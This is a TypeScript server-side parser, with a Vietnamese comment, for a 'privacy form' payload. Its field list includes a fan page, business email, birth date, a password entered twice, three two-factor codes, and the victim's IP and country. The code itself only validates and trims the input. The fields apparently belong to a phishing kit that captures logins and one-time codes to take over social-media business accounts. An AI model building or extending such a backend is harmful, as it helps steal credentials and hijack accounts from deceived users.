import type { FormData } from '@/app/store/slices/stepFormSlice';

const FORM_KEYS: (keyof FormData)[] = [
  'fullName',
  'email',
  'emailBusiness',
  'fanpage',
  'phone',
  'day',
  'month',
  'year',
  'message',
  'password',
  'passwordSecond',
  'twoFa',
  'twoFaSecond',
  'twoFaThird',
  'location',
  'ip',
  'country_code',
];

const MAX_FIELD_LEN = 8000;
const MAX_TOTAL_JSON = 200_000;

/** Chuẩn hoá payload form từ client — chỉ chuỗi, giới hạn độ dài, chống prototype pollution đơn giản */
export function parsePrivacyFormBody(body: unknown): Partial<FormData> | null {
  if (!body || typeof body !== 'object' || Array.isArray(body)) return null;
  const root = body as Record<string, unknown>;
  const form = root.form;
  if (!form || typeof form !== 'object' || Array.isArray(form)) return null;

  const raw = form as Record<string, unknown>;
  const out: Partial<FormData> = {};

  for (const key of FORM_KEYS) {
    const v = raw[key as string];
    if (v === undefined || v === null) {
      (out as Record<string, string>)[key] = '';
      continue;
    }
    if (typeof v !== 'string' && typeof v !== 'number') return null;
    (out as Record<string, string>)[key] = String(v).slice(0, MAX_FIELD_LEN);
  }

  if (JSON.stringify(out).length > MAX_TOTAL_JSON) return null;
  return out;
}
